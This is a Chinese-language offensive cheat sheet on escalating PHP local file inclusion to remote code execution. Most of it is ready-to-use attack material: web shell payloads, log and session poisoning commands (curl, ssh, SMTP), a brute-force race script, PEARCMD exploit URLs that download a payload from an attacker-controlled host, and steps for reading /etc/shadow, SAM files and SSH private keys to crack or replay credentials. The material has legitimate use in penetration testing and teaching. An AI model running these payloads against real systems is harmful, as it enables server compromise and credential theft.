[原文文档](LFI-to-RCE.en.md)

# LFI到RCE

> LFI（本地文件包含）是一种漏洞，当Web应用程序包含本地文件系统中的文件时，通常是由于不安全处理用户输入造成的。如果攻击者能够控制文件路径，他们可能包含敏感或危险的文件，如系统文件（/etc/passwd）、配置文件，甚至可能导致远程代码执行（RCE）的恶意文件。

## 摘要

- [通过/proc/*/fd的LFI到RCE](#通过procfd的lfi到rce)
- [通过/proc/self/environ的LFI到RCE](#通过procselfenviron的lfi到rce)
- [通过iconv的LFI到RCE](#通过iconv的lfi到rce)
- [通过上传的LFI到RCE](#通过上传的lfi到rce)
- [通过上传（竞争条件）的LFI到RCE](#通过上传竞争条件的lfi到rce)
- [通过上传（FindFirstFile）的LFI到RCE](#通过上传findfirstfile的lfi到rce)
- [通过phpinfo()的LFI到RCE](#通过phpinfo的lfi到rce)
- [通过控制日志文件的LFI到RCE](#通过控制日志文件的lfi到rce)
    - [通过SSH的RCE](#通过ssh的rce)
    - [通过邮件的RCE](#通过邮件的rce)
    - [通过Apache日志的RCE](#通过apache日志的rce)
- [通过PHP会话的LFI到RCE](#通过php会话的lfi到rce)
- [通过PHP PEARCMD的LFI到RCE](#通过php-pearcmd的lfi到rce)
- [通过凭证文件的LFI到RCE](#通过凭证文件的lfi到rce)

## 通过/proc/*/fd的LFI到RCE

1. 上传大量Shell（例如：100个）
2. 包含`/proc/$PID/fd/$FD`，其中`$PID`是进程PID，`$FD`是文件描述符。两者都可以暴力破解。

```ps1
http://example.com/index.php?page=/proc/$PID/fd/$FD
```

## 通过/proc/self/environ的LFI到RCE

像日志文件一样，在`User-Agent`头中发送payload，它将反射到`/proc/self/environ`文件中

```powershell
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```

## 通过iconv的LFI到RCE

使用iconv包装器在glibc中触发OOB（CVE-2024-2961），然后使用LFI从`/proc/self/maps`读取内存区域并下载glibc二进制文件。最后通过利用`zend_mm_heap`结构调用已重新映射到`system`的`free()`来获取RCE，使用`custom_heap._free`。

**要求**:

- PHP 7.0.0（2015）到8.3.7（2024）
- GNU C库（`glibc`）<= 2.39
- 访问`convert.iconv`、`zlib.inflate`、`dechunk`过滤器

**利用**:

- [ambionics/cnext-exploits](https://github.com/ambionics/cnext-exploits/tree/main)

## 通过上传的LFI到RCE

如果你能上传文件，只需在其中注入Shell payload（例如：`<?php system($_GET['c']); ?>`）。

```powershell
http://example.com/index.php?page=path/to/uploaded/file.png
```

为了保持文件可读，最好在图片/文档/pdf的元数据中注入

## 通过上传（竞争条件）的LFI到RCE

- 上传文件并触发自包含。
- 大量重复上传来：
- 增加我们赢得竞争的机会
- 增加猜测概率
- 暴力破解/tmp/[0-9a-zA-Z]{6}的包含
- 享受我们的Shell。

```python
import itertools
import requests
import sys

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
    requests.post('http://target.com/index.php?c=index.php', f)


print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
    url = 'http://target.com/index.php?c=/tmp/php' + fname
    r = requests.get(url)
    if 'load average' in r.text:  # <?php echo system('uptime');
        print('[+] We have got a shell: ' + url)
        sys.exit(0)

print('[x] Something went wrong, please try again')
```

## 通过上传（FindFirstFile）的LFI到RCE

:warning: 仅在Windows上工作

`FindFirstFile`允许在Windows的LFI路径中使用掩码（`<<`作为`*`，`>`作为`?`）。掩码本质上是搜索模式，可以包含通配符字符，允许用户或开发者基于部分名称或类型搜索文件或目录。在FindFirstFile的上下文中，掩码用于过滤和匹配文件或目录的名称。

- `*`/`<<` : 代表任意字符序列。
- `?`/`>` : 代表任意单个字符。

上传一个文件，它应该存储在临时文件夹`C:\Windows\Temp\`中，生成的文件名类似`php[A-F0-9]{4}.tmp`。
然后要么暴力破解65536个文件名，要么使用通配符字符：`http://site/vuln.php?inc=c:\windows\temp\php<<`

## 通过phpinfo()的LFI到RCE

PHPinfo()显示任何变量的内容，如**$_GET**、**$_POST**和**$_FILES**。

> 通过对PHPInfo脚本进行多次上传发布，并仔细控制读取，可以检索临时文件的名称并向LFI脚本发出请求，指定临时文件名。

使用脚本[phpInfoLFI.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)

## 通过控制日志文件的LFI到RCE

只需通过对服务（Apache、SSH等）发出请求并将PHP代码附加到日志文件中，然后包含日志文件。

```powershell
http://example.com/index.php?page=/var/log/apache/access.log
http://example.com/index.php?page=/var/log/apache/error.log
http://example.com/index.php?page=/var/log/apache2/access.log
http://example.com/index.php?page=/var/log/apache2/error.log
http://example.com/index.php?page=/var/log/nginx/access.log
http://example.com/index.php?page=/var/log/nginx/error.log
http://example.com/index.php?page=/var/log/vsftpd.log
http://example.com/index.php?page=/var/log/sshd.log
http://example.com/index.php?page=/var/log/mail
http://example.com/index.php?page=/var/log/httpd/error_log
http://example.com/index.php?page=/usr/local/apache/log/error_log
http://example.com/index.php?page=/usr/local/apache2/log/error_log
```

### 通过SSH的RCE

尝试使用PHP代码作为用户名`<?php system($_GET["cmd"]);?>`SSH到机器。

```powershell
ssh <?php system($_GET["cmd"]);?>@10.10.10.10
```

然后在Web应用程序中包含SSH日志文件。

```powershell
http://example.com/index.php?page=/var/log/auth.log&cmd=id
```

### 通过邮件的RCE

首先使用开放的SMTP发送电子邮件，然后包含位于`http://example.com/index.php?page=/var/log/mail`的日志文件。

```powershell
root@kali:~# telnet 10.10.10.10. 25
Trying 10.10.10.10....
Connected to 10.10.10.10..
Escape character is '^]'.
220 straylight ESMTP Postfix (Debian/GNU)
helo ok
250 straylight
mail from: mail@example.com
250 2.1.0 Ok
rcpt to: root
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
subject: <?php echo system($_GET["cmd"]); ?>
data2
.
```

在某些情况下，您也可以使用`mail`命令行发送电子邮件。

```powershell
mail -s "<?php system($_GET['cmd']);?>" www-data@10.10.10.10. < /dev/null
```

### 通过Apache日志的RCE

在访问日志中污染User-Agent：

```ps1
curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
```

注意：日志会转义双引号，因此在PHP payload中的字符串使用单引号。

然后通过LFI请求日志并执行您的命令。

```ps1
curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
```

## 通过PHP会话的LFI到RCE

检查网站是否使用PHP会话（PHPSESSID）

```javascript
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```

在PHP中，这些会话存储在/var/lib/php5/sess_[PHPSESSID]或/var/lib/php/sessions/sess_[PHPSESSID]文件中

```javascript
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```

将cookie设置为`<?php system('cat /etc/passwd');?>`

```powershell
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```

使用LFI包含PHP会话文件

```powershell
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
```

## 通过PHP PEARCMD的LFI到RCE

PEAR是用于可重用PHP组件的框架和分发系统。默认情况下，`pearcmd.php`安装在来自[hub.docker.com](https://hub.docker.com/_/php)的每个Docker PHP镜像中的`/usr/local/lib/php/pearcmd.php`。

文件`pearcmd.php`使用`$_SERVER['argv']`获取其参数。在PHP配置（`php.ini`）中，指令`register_argc_argv`必须设置为`On`才能使此攻击生效。

```ini
register_argc_argv = On
```

有以下利用方法。

- **方法1**: config create

  ```ps1
  /vuln.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=eval($_GET['cmd'])?>+/tmp/exec.php
  /vuln.php?file=/tmp/exec.php&cmd=phpinfo();die();
  ```

- **方法2**: man_dir

  ```ps1
  /vuln.php?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/exec.php+-d+man_dir=<?echo(system($_GET['c']));?>+-s+
  /vuln.php?file=/tmp/exec.php&c=id
  ```

  创建的配置文件包含WebShell。

  ```php
  #PEAR_Config 0.9
  a:2:{s:10:"__channels";a:2:{s:12:"pecl.php.net";a:0:{}s:5:"__uri";a:0:{}}s:7:"man_dir";s:29:"<?echo(system($_GET['c']));?>";}
  ```

- **方法3**: download（需要外部网络连接）。

  ```ps1
  /vuln.php?file=/usr/local/lib/php/pearcmd.php&+download+http://<ip>:<port>/exec.php
  /vuln.php?file=exec.php&c=id
  ```

- **方法4**: install（需要外部网络连接）。注意`exec.php`位于`/tmp/pear/download/exec.php`。

  ```ps1
  /vuln.php?file=/usr/local/lib/php/pearcmd.php&+install+http://<ip>:<port>/exec.php
  /vuln.php?file=/tmp/pear/download/exec.php&c=id
  ```

## 通过凭证文件的LFI到RCE

此方法需要在应用程序内具有高权限才能读取敏感文件。

### Windows版本

提取`sam`和`system`文件。

```powershell
http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam
http://example.com/index.php?page=../../../../../../WINDOWS/repair/system
```

然后从这些文件中提取哈希`samdump2 SYSTEM SAM > hashes.txt`，并使用`hashcat/john`破解它们或使用Pass The Hash技术重放它们。

### Linux版本

提取`/etc/shadow`文件。

```powershell
http://example.com/index.php?page=../../../../../../etc/shadow
```

然后破解其中的哈希，以便通过SSH登录机器。

另一种通过LFI获得对Linux机器的SSH访问的方法是读取私有SSH密钥文件：`id_rsa`。
如果SSH处于活动状态，通过包含`/etc/passwd`的内容检查机器中正在使用哪个用户，并尝试访问每个有家目录的用户的`/<HOME>/.ssh/id_rsa`。

## 参考

- [LFI WITH PHPINFO() ASSISTANCE - Brett Moore - September 2011](https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf)
- [LFI2RCE via PHP Filters - HackTricks - July 19, 2024](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters)
- [Local file inclusion tricks - Johan Adriaans - August 4, 2007](http://devels-playground.blogspot.fr/2007/08/local-file-inclusion-tricks.html)
- [PHP LFI to arbitrary code execution via rfc1867 file upload temporary files (EN) - Gynvael Coldwind - March 18, 2011](https://gynvael.coldwind.pl/?id=376)
- [PHP LFI with Nginx Assistance - Bruno Bierbaumer - 26 Dec 2021](https://bierbaumer.net/security/php-lfi-with-nginx-assistance/)
- [Upgrade from LFI to RCE via PHP Sessions - Reiners - September 14, 2017](https://web.archive.org/web/20170914211708/https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/)